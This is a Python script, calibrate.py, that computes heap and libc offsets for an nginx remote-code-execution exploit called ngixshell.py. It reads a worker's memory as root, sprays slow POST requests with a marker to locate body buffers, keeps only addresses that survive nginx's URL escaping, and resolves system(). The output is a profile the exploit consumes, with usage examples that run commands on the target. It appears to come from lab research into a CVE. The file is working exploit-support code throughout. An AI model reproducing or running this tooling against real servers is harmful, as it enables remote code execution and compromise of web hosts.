#!/usr/bin/env python3
"""
calibrate.py — compute HEAP_BASE and PREREAD_HEAP_OFFSETS for any nginx worker.

Requirements
------------
* Local root access to /proc/<worker_pid>/mem (run as root on the target host)
* ASLR disabled: echo 0 > /proc/sys/kernel/randomize_va_space
* nginx configured with a proxy_pass location (for body buffering) and a
  rewrite location (CVE trigger path)

Usage
-----
  sudo python3 calibrate.py <host> <port> <worker_pid> --spray-path /spray \
      --spray-mode full --json -o profile.json
  # restart nginx so the worker starts from the same clean heap state, then:
  python3 ngixshell.py <host> --cmd 'id > /tmp/rce.txt' --build-file profile.json

The script replicates the requests ngixshell makes before spraying (TLS probe,
fingerprint, wait_alive) so the offsets line up at exploitation time.

Output
------
Writes a calibration profile (HEAP_BASE, LIBC_BASE, system(), URL-safe spray
offsets, spray mode/path/count) consumed by ngixshell.py via --build-file.

Example
-------
  sudo python3 calibrate.py 127.0.0.1 19321 12345 --json -o profile.json
"""

import argparse, json, platform, socket, time, sys, os, re, subprocess

# ─── NGX_ESCAPE_ARGS safe-byte filter ─────────────────────────────────────────
_T = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
SAFE = set(b for b in range(256) if not (_T[b >> 5] & (1 << (b & 0x1f))))


def is_safe(addr: int) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))


def read_heap_ranges(pid: int):
    ranges = []
    with open(f"/proc/{pid}/maps") as f:
        for line in f:
            if "[heap]" in line:
                s, e = line.split()[0].split("-")
                ranges.append((int(s, 16), int(e, 16)))
    return ranges


# Unique marker placed at the start of the spray body: the body buffer address
# is what the overflow must target, so we locate exactly that allocation.
MARKER = b"NGIXCALIBRATION-SENTINEL-"


def exploit_warmup(host: str, port: int) -> None:
    """Replicate what ngixshell does before the spray in --cmd mode.

    The exploit performs a TLS auto-detect connect, a fingerprint GET and a
    wait_alive GET before it starts spraying. Those requests move the heap
    cursor, so calibration must start from the same state or the offsets will
    not match at exploitation time. When ngixshell.py sits next to this
    script, its real functions are used for a byte-exact warmup.
    """
    here = os.path.dirname(os.path.abspath(__file__))
    if here not in sys.path:
        sys.path.insert(0, here)
    try:
        import ngixshell as ngs
    except ImportError:
        ngs = None

    if ngs is not None:
        try:
            ngs._auto_detect_tls(host, port)
        except Exception:
            pass
        try:
            ngs.fingerprint_target(host, port)
        except Exception:
            pass
        try:
            ngs.wait_alive(host, port, timeout=1)
        except Exception:
            pass
        return

    try:
        s = socket.create_connection((host, port), timeout=4)
        s.close()
    except OSError:
        pass
    for _ in range(2):
        try:
            s = socket.create_connection((host, port), timeout=4)
            s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                      f"Connection: close\r\n\r\n".encode())
            s.settimeout(3)
            try:
                s.recv(1024)
            except OSError:
                pass
            s.close()
        except OSError:
            pass


def find_markers(pid: int, marker: bytes = MARKER) -> list:
    """Return every heap address where `marker` currently lives."""
    addrs = []
    for start, end in read_heap_ranges(pid):
        try:
            with open(f"/proc/{pid}/mem", "rb") as mem:
                mem.seek(start)
                data = mem.read(end - start)
        except (OSError, OverflowError):
            continue
        pos = 0
        while True:
            idx = data.find(marker, pos)
            if idx == -1:
                break
            addrs.append(start + idx)
            pos = idx + 1
    return addrs


def open_slow_post(host: str, port: int, body_len: int = 4096,
                   proxy_path: str = "/upload",
                   spray_mode: str = "partial") -> socket.socket:
    """Open a POST holding the body buffer alive.

    partial: claim 4× the body length, send less       (bundled lab)
    full:    send the complete body + X-Delay header   (DepthFirst lab)
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    body = MARKER + b"X" * (body_len - len(MARKER))
    if spray_mode == "full":
        clen   = body_len
        extra  = b"X-Delay: 60\r\n"
        conn   = b"close"          # must match ngixshell's full-mode request
        tail   = body
    else:
        clen   = body_len * 4
        extra  = b""
        conn   = b"keep-alive"
        tail   = body
    s.sendall(
        b"POST " + proxy_path.encode() + b" HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: " + str(clen).encode() + b"\r\n"
        + extra +
        b"Connection: " + conn + b"\r\n"
        b"\r\n" + tail
    )
    return s


def find_system(pid: int):
    """Return (libc_base, system_offset) from /proc/pid/maps + readelf."""
    with open(f"/proc/{pid}/maps") as f:
        for line in f:
            parts = line.split()
            if len(parts) < 6: continue
            path = parts[5]
            if ("libc" in path or "musl" in path) and "r-xp" in parts[1]:
                libc_base = int(parts[0].split("-")[0], 16)
                libc_file = f"/proc/{pid}/root{path}" if os.path.exists(f"/proc/{pid}/root{path}") else path
                try:
                    out = subprocess.check_output(
                        ["readelf", "-s", libc_file], stderr=subprocess.DEVNULL
                    ).decode()
                    for l in out.splitlines():
                        if " system" in l and ("FUNC" in l or "func" in l):
                            m = re.search(r"^\s+\d+:\s+([0-9a-f]+)\s", l)
                            if m:
                                # st_value is the offset from the ELF load base;
                                # the mapping in /proc/<pid>/maps starts at
                                # (base + segment file offset).
                                raw_offset = int(m.group(1), 16)
                                file_off   = int(parts[2], 16)
                                return libc_base - file_off, raw_offset
                except Exception:
                    pass
    return None, None


def main():
    ap = argparse.ArgumentParser(
        description="Compute HEAP_BASE / libc / pool offsets for a target nginx worker.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example:\n  python3 calibrate.py 127.0.0.1 19321 12345 --json -o profile.json",
    )
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("worker_pid", type=int)
    ap.add_argument("--json", action="store_true",
                    help="print a machine-readable profile (for ngixshell.py --build-file)")
    ap.add_argument("-o", "--output", metavar="FILE",
                    help="write the JSON profile to FILE")
    ap.add_argument("--iterations", type=int, default=30, metavar="N",
                    help="spray connections to sample (default: 30)")
    ap.add_argument("--body-len", type=int, default=4096, metavar="N",
                    help="spray body size in bytes (default: 4096; must match "
                         "the exploit's --body-len)")
    ap.add_argument("--max-offsets", type=int, default=64, metavar="N",
                    help="cap the number of offsets written to the profile "
                         "(default: 64)")
    ap.add_argument("--spray-path", metavar="PATH", default="/upload",
                    help="location used for the spray (default: /upload)")
    ap.add_argument("--spray-mode", choices=["partial", "full"], default="partial",
                    help="partial: short body + large Content-Length (bundled lab); "
                         "full: complete body + X-Delay (DepthFirst lab)")
    ap.add_argument("--no-warmup", action="store_true",
                    help="skip the pre-spray warmup that replicates ngixshell's "
                         "exploit mode (TLS connect + fingerprint GET + wait_alive)")
    args = ap.parse_args()

    HOST = args.host
    PORT = args.port
    PID  = args.worker_pid

    heap_ranges = read_heap_ranges(PID)
    if not heap_ranges:
        print(f"[!] Cannot read /proc/{PID}/maps — run as root?")
        sys.exit(1)

    HEAP_BASE = heap_ranges[0][0]
    print(f"[*] Worker PID : {PID}")
    print(f"[*] HEAP_BASE  : 0x{HEAP_BASE:x}")

    libc_base, sys_off = find_system(PID)
    if libc_base:
        print(f"[*] LIBC_BASE  : 0x{libc_base:x}")
        print(f"[*] sys_offset : 0x{sys_off:x}")
        print(f"[*] SYSTEM_ADDR: 0x{libc_base + sys_off:x}")
    else:
        print("[!] Could not locate system() — check libc path")

    if not args.no_warmup:
        print()
        print("[*] Warmup: replicating ngixshell's pre-spray requests ...")
        exploit_warmup(HOST, PORT)

    print()
    print("[*] Opening spray connections and locating each body buffer ...")

    conns = []
    unsafe = 0
    seen = set()
    safe_offsets_ordered = []
    found_this_round = 0

    for n in range(args.iterations):
        c = open_slow_post(HOST, PORT, body_len=args.body_len,
                           proxy_path=args.spray_path,
                           spray_mode=args.spray_mode)
        # the worker may need a moment to read and buffer the body
        new_addrs = []
        for _ in range(25):
            new_addrs = [a for a in find_markers(PID) if a not in seen]
            if new_addrs:
                break
            time.sleep(0.2)
        if not new_addrs:
            print(f"  conn {n+1:2d}: body buffer not found — increase --body-len?")
        else:
            found_this_round += 1
            for addr in new_addrs:
                seen.add(addr)
                off  = addr - HEAP_BASE
                safe = is_safe(addr)
                print(f"  conn {n+1:2d}: body buffer at heap+0x{off:06x} "
                      f"({'URL-SAFE' if safe else 'unsafe'})")
                if safe:
                    if off not in safe_offsets_ordered:
                        safe_offsets_ordered.append(off)
                else:
                    unsafe += 1
        conns.append(c)

    for c in conns:
        try: c.close()
        except: pass

    safe_offsets = safe_offsets_ordered
    print(f"[*] {found_this_round}/{args.iterations} spray buffers located, "
          f"{len(safe_offsets)} URL-safe ({unsafe} dropped by the escape filter)")
    if len(safe_offsets) > args.max_offsets:
        print(f"[*] capping profile to the first {args.max_offsets} offsets")
        safe_offsets = safe_offsets[:args.max_offsets]

    profile = {
        "heap_base":   HEAP_BASE,
        "libc_base":   libc_base,
        "sys_offset":  sys_off,
        "system_addr": (libc_base + sys_off) if (libc_base and sys_off) else None,
        "offsets":     sorted(set(safe_offsets)),
        "spray_count": args.iterations,
        "spray_path":  args.spray_path,
        "spray_mode":  args.spray_mode,
        "arch":        platform.machine(),
    }

    print()
    print("=" * 60)
    print("  CALIBRATION RESULT")
    print("=" * 60)
    print(f"  HEAP_BASE  = 0x{HEAP_BASE:x}")
    if libc_base:
        print(f"  LIBC_BASE  = 0x{libc_base:x}")
        print(f"  sys_offset = 0x{sys_off:x}")
    print()
    print("  Use with ngixshell.py:")
    print()
    print("    python3 ngixshell.py <host> --cmd 'id' "
          "--build-file profile.json")

    if args.json or args.output:
        print()
        print(json.dumps(profile, indent=2))

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(profile, f, indent=2)
        print(f"[*] Profile written to {args.output}")

    if not safe_offsets:
        print()
        print("  [!] No URL-safe offsets found — the exploit cannot encode this")
        print("      heap address in the URI (nginx NGX_ESCAPE_ARGS filter).")
        if platform.machine() != "x86_64":
            print(f"      Architecture is {platform.machine()}: the current exploit is")
            print("      x86_64-only (arm64 heap addresses like 0xaaaa... always contain")
            print("      non-URL-safe bytes). Use an x86_64 target with ASLR disabled.")
        else:
            print("      Try a different build (lower HEAP_BASE) or pair the bug with")
            print("      an info leak for ASLR bypass.")


if __name__ == "__main__":
    main()
